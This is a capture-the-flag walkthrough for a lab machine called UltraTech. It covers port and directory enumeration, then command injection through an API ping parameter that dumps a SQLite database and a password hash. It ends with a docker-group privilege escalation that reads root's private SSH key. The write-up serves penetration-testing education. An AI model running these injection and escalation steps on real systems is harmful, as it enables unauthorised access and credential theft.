# UltraTech

## The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing

# It's enumeration time!

## After enumerating the services and resources available on this machine, what did you discover?

### Which software is using the port 8081?

### Which other non-standard port is used?

### Which software using this port?

### Which GNU/Linux distribution seems to be used?

All the answers for these questions we can get from this nmap command

```Bash
nmap -p- -sV <IP>
```

- `-p `: Allow us to scan selected ports
- `-sV`: Probes ports to determine service/version info

[SCREEN01]

### The software using the port 8081 is a REST api, how many of its routes are used by the web application

Scan the api with gobuster

```Bash
gobuster dir -u http://<IP>:8081 -w /root/Tools/wordlists/dirbuster/directory-list-1.0.txt
```

[SCREEN02]

# Let the fun begin

## Now that you know which services are available, it's time to exploit them! Did you find somewhere you could try to login? Great! Quick and dirty login implementations usually goes with poor data management. There must be something you can do to explore this machine more thoroughly.

### There is a database lying around, what is its filename?

1. Enumerate the second port for interesting endpoints

```Bash
gobuster dir -u http://<IP>:31331 -w /root/Tools/wordlists/dirbuster/directory-list-1.0.txt -x js,php,txt,html
```

[SCREEN03]

2. In the source of `<IP>:31331/partners.html` we can find link to `http://<IP>:31331/js/api.js` which lead us to the `http://${getAPIURL()}/ping?ip=${window.location.hostname}` in which we can perform injection by adding ;\`ls\` at the end

[SCREEN04]
[SCREEN05]

### What is the first user's password hash?

1. Add ;\`cat utech.db.sqlite\`

[SCREEN06]

### What is the password associated with this hash?

1. Put the hash in the [Crack Station](https://crackstation.net/)

[SCREEN07]

# The root of all evil

## Congrats if you've made it this far, you should be able to comfortably run commands on the server by now! Now's the time for the final step! You'll be on your own for this one, there is only one question and there might be more than a single way to reach your goal. Mistakes were made, take advantage of it.

### What are the first 9 characters if the root user's private SSH key?

1. Login with ssh, and check the groups

```Bash
ssh r00t@<IP>
id
```

[SCREEN08]

2. Since we are in a docker group, we can exploit it using [GTFOBins](https://gtfobins.github.io/gtfobins/docker/), and upgrade bash

```Bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

[SCREEN09]

3. The private/public keys are stored in the usual place:

```Bash
find / -type f -name "*.pub"
ls /root/.ssh/
cat /root/.ssh/id_rsa
```

[SCREEN10]
